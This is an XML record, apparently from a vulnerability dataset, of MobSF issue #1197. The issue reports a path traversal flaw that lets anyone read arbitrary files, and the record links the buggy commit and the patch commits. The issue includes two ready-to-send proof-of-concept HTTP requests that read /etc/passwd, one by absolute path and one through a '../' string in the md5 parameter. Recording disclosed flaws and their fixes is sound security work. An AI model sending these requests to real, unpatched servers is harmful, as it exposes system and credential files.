@@ -1,0 +1,32 @@
+<?xml version="1.0" ?>
+<ISSUE>
+  <ISSUENO>1197</ISSUENO>
+  <ISSUEURL>https://github.com/MobSF/Mobile-Security-Framework-MobSF/issues/1197</ISSUEURL>
+  <TITLE>[Security] Local file reading regression &lt; 3.0.0</TITLE>
+  <DESCRIPTION>&lt;!-- ## IMPORTANT --&gt; &lt;!-- If you see errors while running setup/run scripts, it is mostly because you haven't installed the required dependencies correctly. You will have to look into the errors and figure out what is causing them and solve them accordingly. Make sure you have installed all the required dependencies and their correct versions as per the latest documentation. If you still find yourself at a dead end, join MobSF Slack channel: http://tiny.cc/mobsf Please do not post support/help request in GitHub issues, doing so will definitely waste our time get them closed without further response. --&gt; ## ENVIRONMENT ``` Docker latest version ``` ## EXPLANATION OF THE ISSUE It is possible to read any file on the system. ## STEPS TO REPRODUCE THE ISSUE 1st poc (specify absolute path): ``` GET /ViewFile/?file=/etc/passwd&amp;md5=376a1470cd79dc44a96615337c5b51c2&amp;type=ios HTTP/1.1 Host: 0.0.0.0:8000 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3971.0 Safari/537.36 autochrome/blue Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close ``` 2nd poc (specify path instead of real md5): ``` GET /ViewFile/?file=etc/passwd&amp;md5=../../../../../../../../../..///&amp;type=ios HTTP/1.1 Host: 0.0.0.0:8000 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3971.0 Safari/537.36 autochrome/blue Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close ```</DESCRIPTION>
+  <REPONAME>Mobile-Security-Framework-MobSF</REPONAME>
+  <TIMEDIFFERENCEDAYS>0</TIMEDIFFERENCEDAYS>
+  <BUGGYCOMMIT>
+    <MESSAGE>MobSF v3 UI Upgrade * MobSF UI Refresh. Uses Admin LTE 3.0.1 -https://github.com/ColorlibHQ/AdminLTE/releases/tag/v3.0.1 * HTML, JS, CSS QA and Update * Removed Stale code * UI Element Standardization</MESSAGE>
+    <SHA>d0e5bcca98b3d612c55c293237d863c18328acb4</SHA>
+  </BUGGYCOMMIT>
+  <PATCHCOMMITS>
+    <COMMIT>
+      <MESSAGE>Fix Security issue #1197 This fixes form validation. We need one more issue specific to path validation.</MESSAGE>
+      <SHA>2a74243b0e9fbd8ae6e2a44d5f7ebeaa860d2654</SHA>
+      <PATCHEDFILES>
+        <FILE>StaticAnalyzer/forms.py</FILE>
+      </PATCHEDFILES>
+    </COMMIT>
+    <COMMIT>
+      <MESSAGE>Fix #1197 - Security Issue Path Traversal</MESSAGE>
+      <SHA>030d0f27255f0de9f649b080928abf9bbc440bba</SHA>
+      <PATCHEDFILES>
+        <FILE>DynamicAnalyzer/views/android/report.py</FILE>
+        <FILE>StaticAnalyzer/views/android/view_source.py</FILE>
+        <FILE>StaticAnalyzer/views/comparer.py</FILE>
+        <FILE>StaticAnalyzer/views/ios/view_source.py</FILE>
+      </PATCHEDFILES>
+    </COMMIT>
+  </PATCHCOMMITS>
+</ISSUE>
